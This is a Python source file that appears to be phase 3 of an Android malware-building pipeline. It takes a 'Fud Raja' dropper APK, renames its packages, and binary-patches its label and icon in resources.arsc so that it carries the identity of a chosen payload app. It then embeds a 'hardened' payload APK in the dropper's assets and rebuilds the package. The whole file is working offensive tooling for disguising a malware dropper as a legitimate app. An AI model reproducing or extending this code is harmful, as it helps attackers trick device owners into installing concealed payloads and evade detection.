"""Phase 3: Dropper Identity Transplant + Embed Hardened Payload.

The dropper is given the EXACT identity of the payload:
  3.1  Package name   → payload's package name (both fud.Raja AND com.amanmehra.installer)
  3.2  App label      → payload's app label   (binary-patched in resources.arsc)
  3.3  Launcher icon  → payload's icon        (res/BW.xml renamed to BW.png, arsc patched)
  3.4  Assets icon    → payload's icon        (dexoptGoogle_Play.png replaced)
  3.5  Embed payload  → assets/output.apk     (hardened APK from Phase 1)
  3.6  HTML year      → 2026
  3.7  Rebuild
"""
import os, re, shutil, subprocess, zipfile
from pathlib import Path
from config import TEMP_DIR, APKTOOL, AAPT
from utils.logger import setup_logger
from utils.package_rename import rename_package

logger = setup_logger()

# ── Constants ─────────────────────────────────────────────────────────────────
# The dropper template uses these two package namespaces.
# The manifest package is fud.Raja; the component class prefix is com.amanmehra.installer.
_DROPPER_MANIFEST_PKG   = 'fud.Raja'
_DROPPER_COMPONENT_PKG  = 'com.amanmehra.installer'
_DROPPER_LABEL          = 'Fud Raja Dropper'   # label string in resources.arsc (UTF-8)
_DROPPER_ICON_XML       = 'res/BW.xml'         # icon path recorded in resources.arsc
_DROPPER_ICON_PNG       = 'res/BW.png'         # replacement path (same byte-length)


# ── 3.1  Package rename ───────────────────────────────────────────────────────

def _rename_packages(decompiled: str, payload_pkg: str):
    """Replace all occurrences of both dropper package namespaces with payload_pkg."""
    logger.info(f"[*] 3.1 Package rename → {payload_pkg}")

    # a) rename_package handles: smali dirs + files, XML files, resources.arsc binary,
    #    and apktool.yml renameManifestPackage.
    rename_package(decompiled, _DROPPER_COMPONENT_PKG, payload_pkg)

    # b) The manifest package is fud.Raja — set renameManifestPackage so apktool
    #    writes the correct package attribute into the rebuilt binary manifest.
    yml_path = os.path.join(decompiled, 'apktool.yml')
    if os.path.exists(yml_path):
        with open(yml_path, 'r') as f:
            yml = f.read()
        yml = re.sub(
            r'renameManifestPackage:\s*\S*',
            f'renameManifestPackage: {payload_pkg}',
            yml
        )
        if 'renameManifestPackage:' not in yml:
            yml = yml.replace('packageInfo:\n',
                              f'packageInfo:\n  renameManifestPackage: {payload_pkg}\n')
        with open(yml_path, 'w') as f:
            f.write(yml)
        logger.info(f"  [+] apktool.yml renameManifestPackage → {payload_pkg}")

    # c) Also sweep smali for remaining fud/Raja references (the smali dir may have
    #    a flat smali/fud/ directory that rename_package doesn't know about since it
    #    only handles the _DROPPER_COMPONENT_PKG path).
    old_slashes = _DROPPER_MANIFEST_PKG.replace('.', '/')   # fud/Raja
    new_slashes = payload_pkg.replace('.', '/')
    smali_root = Path(decompiled)
    for smali_dir in [d for d in smali_root.iterdir()
                      if d.is_dir() and d.name.startswith('smali')]:
        for sf in smali_dir.rglob('*.smali'):
            try:
                txt = sf.read_text('utf-8')
                if _DROPPER_MANIFEST_PKG in txt or old_slashes in txt:
                    txt = txt.replace(_DROPPER_MANIFEST_PKG, payload_pkg)
                    txt = txt.replace(old_slashes, new_slashes)
                    sf.write_text(txt, 'utf-8')
            except UnicodeDecodeError:
                pass

    logger.info(f"[+] 3.1 Package rename complete: {_DROPPER_MANIFEST_PKG} + "
                f"{_DROPPER_COMPONENT_PKG} → {payload_pkg}")


# ── 3.2  App label ────────────────────────────────────────────────────────────

def _patch_label(decompiled: str, payload_label: str | None):
    """Binary-patch 'Fud Raja Dropper' in resources.arsc with the payload's label.

    The replacement is padded/truncated to the original byte length so the arsc
    string-pool offsets stay valid without a full re-parse.
    """
    if not payload_label:
        logger.info("  [~] No payload label — keeping dropper label as-is")
        return

    arsc = os.path.join(decompiled, 'resources.arsc')
    if not os.path.exists(arsc):
        return

    old_b = _DROPPER_LABEL.encode('utf-8')
    new_b = payload_label.encode('utf-8')
    old_len = len(old_b)

    # Pad with spaces or truncate to the exact original byte length so the
    # length prefix byte in the string pool does not need to change.
    if len(new_b) < old_len:
        new_b = new_b + b' ' * (old_len - len(new_b))
    elif len(new_b) > old_len:
        new_b = new_b[:old_len]

    data = bytearray(open(arsc, 'rb').read())
    count = 0
    idx = 0
    while True:
        idx = data.find(old_b, idx)
        if idx == -1:
            break
        data[idx:idx + old_len] = new_b
        count += 1
        idx += old_len

    with open(arsc, 'wb') as f:
        f.write(data)
    logger.info(f"[+] 3.2 Label patched in arsc ({count} occurrences): "
                f"'{_DROPPER_LABEL}' → '{payload_label}'")


# ── 3.3  Launcher icon ────────────────────────────────────────────────────────

def _extract_best_icon(payload_apk: str) -> bytes | None:
    """Extract the highest-density launcher icon PNG from the payload APK."""
    if not os.path.exists(payload_apk):
        return None

    # Ask aapt for icon paths ordered by density (highest last)
    try:
        r = subprocess.run([AAPT, 'd', 'badging', payload_apk],
                           capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            best_path = None
            best_density = -1
            for line in r.stdout.split('\n'):
                if line.startswith('application-icon-'):
                    m = re.search(r'application-icon-(\d+):\'([^\']+)\'', line)
                    if m:
                        density = int(m.group(1))
                        path = m.group(2)
                        if density > best_density and path.endswith('.png'):
                            best_density = density
                            best_path = path
            if best_path:
                with zipfile.ZipFile(payload_apk, 'r') as z:
                    try:
                        data = z.read(best_path)
                        logger.info(f"  [+] Payload icon: {best_path} "
                                    f"({len(data)} bytes, density {best_density})")
                        return data
                    except KeyError:
                        pass
    except Exception as e:
        logger.warning(f"  [!] aapt icon extraction failed: {e}")

    # Fallback: scan the APK for any PNG that looks like a launcher icon
    try:
        with zipfile.ZipFile(payload_apk, 'r') as z:
            candidates = [n for n in z.namelist()
                          if n.endswith('.png') and ('mipmap' in n or 'ic_launcher' in n.lower())]
            if candidates:
                # Pick the largest file (highest res)
                best = max(candidates, key=lambda n: z.getinfo(n).file_size)
                data = z.read(best)
                logger.info(f"  [+] Fallback icon: {best} ({len(data)} bytes)")
                return data
    except Exception as e:
        logger.warning(f"  [!] Fallback icon scan failed: {e}")

    return None


def _replace_launcher_icon(decompiled: str, icon_data: bytes | None):
    """Swap the launcher icon by:
      1. Renaming res/BW.xml → res/BW.png in the decompiled directory.
      2. Writing the payload's PNG to res/BW.png.
      3. Binary-patching resources.arsc: 'res/BW.xml' → 'res/BW.png' (same 10 bytes).
    """
    if not icon_data:
        logger.info("  [~] No icon data — launcher icon unchanged")
        return

    res_dir = os.path.join(decompiled, 'res')
    icon_xml = os.path.join(res_dir, 'BW.xml')
    icon_png = os.path.join(res_dir, 'BW.png')

    if not os.path.exists(icon_xml):
        logger.warning("  [!] res/BW.xml not found — cannot replace launcher icon")
        return

    # Remove the old binary XML vector and write the PNG in its place
    os.remove(icon_xml)
    with open(icon_png, 'wb') as f:
        f.write(icon_data)
    logger.info(f"  [+] res/BW.xml → res/BW.png ({len(icon_data)} bytes)")

    # Patch resources.arsc: replace the file path string (both strings are 10 bytes)
    arsc_path = os.path.join(decompiled, 'resources.arsc')
    if os.path.exists(arsc_path):
        data = bytearray(open(arsc_path, 'rb').read())
        old_ref = b'res/BW.xml'   # 10 bytes
        new_ref = b'res/BW.png'   # 10 bytes — exact same length, safe binary swap
        count = 0
        idx = 0
        while True:
            idx = data.find(old_ref, idx)
            if idx == -1:
                break
            data[idx:idx + len(old_ref)] = new_ref
            count += 1
            idx += len(old_ref)
        with open(arsc_path, 'wb') as f:
            f.write(data)
        logger.info(f"  [+] resources.arsc: 'res/BW.xml' → 'res/BW.png' ({count} occurrences)")

    logger.info("[+] 3.3 Launcher icon replaced")


# ── 3.4  Assets icon ──────────────────────────────────────────────────────────

def _replace_assets_icon(decompiled: str, icon_data: bytes | None):
    """Replace dexoptGoogle_Play.png in assets/ with the payload's icon."""
    if not icon_data:
        return

    assets_dir = os.path.join(decompiled, 'assets')
    os.makedirs(assets_dir, exist_ok=True)

    target = os.path.join(assets_dir, 'dexoptGoogle_Play.png')
    with open(target, 'wb') as f:
        f.write(icon_data)
    logger.info(f"[+] 3.4 Assets icon (dexoptGoogle_Play.png) replaced ({len(icon_data)} bytes)")


# ── 3.5  Embed hardened payload ───────────────────────────────────────────────

def _embed_payload(decompiled: str, payload_apk: str):
    """Copy hardened payload APK into assets/output.apk."""
    assets_dir = os.path.join(decompiled, 'assets')
    os.makedirs(assets_dir, exist_ok=True)

    # Remove any pre-existing placeholder
    for name in ('output.apk', 'base.apk', 'update.apk'):
        p = os.path.join(assets_dir, name)
        if os.path.exists(p):
            os.remove(p)

    dest = os.path.join(assets_dir, 'output.apk')
    shutil.copy(payload_apk, dest)
    size = os.path.getsize(dest)
    logger.info(f"[+] 3.5 Hardened payload embedded → assets/output.apk ({size:,} bytes)")


# ── 3.6  HTML year ────────────────────────────────────────────────────────────

def _update_html(assets_dir: str):
    html = os.path.join(assets_dir, 'main_ui.html')
    if os.path.exists(html):
        with open(html, 'r', errors='ignore') as f:
            c = f.read()
        c = c.replace('2025', '2026')
        with open(html, 'w', errors='ignore') as f:
            f.write(c)
        logger.info("[+] 3.6 HTML year 2025 → 2026")


# ── Entry point ───────────────────────────────────────────────────────────────

def run(unsigned_dropper: str, hardened_payload_apk: str, base_info: dict = None):
    """Phase 3: Identity Transplant + Embed → dropper_embedded.apk (unsigned).

    Args:
        unsigned_dropper:     Path to dropper_ready.apk from Phase 2.
        hardened_payload_apk: Path to hardened payload APK from Phase 1.
        base_info:            Dict with 'name' (package), 'label', 'apk_path'.
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 3: Dropper Identity Transplant + Embed Payload")
    logger.info("=" * 60)

    info       = base_info or {}
    payload_pkg  = info.get('name')  or 'com.example.payload'
    payload_lbl  = info.get('label') or None
    # Use the original input APK for icon extraction (it's the unmodified source)
    payload_apk_for_icon = info.get('apk_path') or hardened_payload_apk

    logger.info(f"[*] Target identity: pkg={payload_pkg}  label={payload_lbl}")

    # ── Decompile Phase 2 output WITH resources ──────────────────────────────
    logger.info("[*] Decompiling dropper with resources...")
    decompiled = str(TEMP_DIR / "phase3_decompiled")
    r = subprocess.run(
        [APKTOOL, "d", "-f", "-o", decompiled, unsigned_dropper],
        capture_output=True, text=True, timeout=180
    )
    if r.returncode != 0:
        # Fallback: decode without resources (no icon replacement then)
        logger.warning(f"[!] apktool d failed, retrying with --no-res: {r.stderr[:200]}")
        r = subprocess.run(
            [APKTOOL, "d", "--no-res", "-f", "-o", decompiled, unsigned_dropper],
            capture_output=True, text=True, timeout=180
        )
        if r.returncode != 0:
            raise Exception(f"apktool d failed: {r.stderr[:500]}")

    # ── Extract payload icon (needed for 3.3 and 3.4) ───────────────────────
    logger.info("[*] Extracting payload icon...")
    icon_data = _extract_best_icon(payload_apk_for_icon)

    # ── 3.1  Package rename ──────────────────────────────────────────────────
    _rename_packages(decompiled, payload_pkg)

    # ── 3.2  App label ───────────────────────────────────────────────────────
    _patch_label(decompiled, payload_lbl)

    # ── 3.3  Launcher icon ───────────────────────────────────────────────────
    _replace_launcher_icon(decompiled, icon_data)

    # ── 3.4  Assets icon ─────────────────────────────────────────────────────
    _replace_assets_icon(decompiled, icon_data)

    # ── 3.5  Embed hardened payload ──────────────────────────────────────────
    _embed_payload(decompiled, hardened_payload_apk)

    # ── 3.6  HTML year ───────────────────────────────────────────────────────
    _update_html(os.path.join(decompiled, 'assets'))

    # ── Rebuild ──────────────────────────────────────────────────────────────
    logger.info("[*] Rebuilding embedded dropper...")
    embedded = str(TEMP_DIR / "dropper_embedded.apk")
    r = subprocess.run(
        [APKTOOL, "b", "-o", embedded, decompiled],
        capture_output=True, text=True, timeout=300
    )
    if r.returncode != 0:
        logger.warning(f"[!] apktool b failed, retrying with --use-aapt2: {r.stderr[:200]}")
        r = subprocess.run(
            [APKTOOL, "b", "--use-aapt2", "-o", embedded, decompiled],
            capture_output=True, text=True, timeout=300
        )
        if r.returncode != 0:
            raise Exception(f"apktool b failed: {r.stderr[:500]}")

    shutil.rmtree(decompiled, ignore_errors=True)
    size_mb = os.path.getsize(embedded) / 1048576
    logger.info(f"[+] Phase 3 Complete: {embedded} ({size_mb:.1f} MB)")
    return embedded
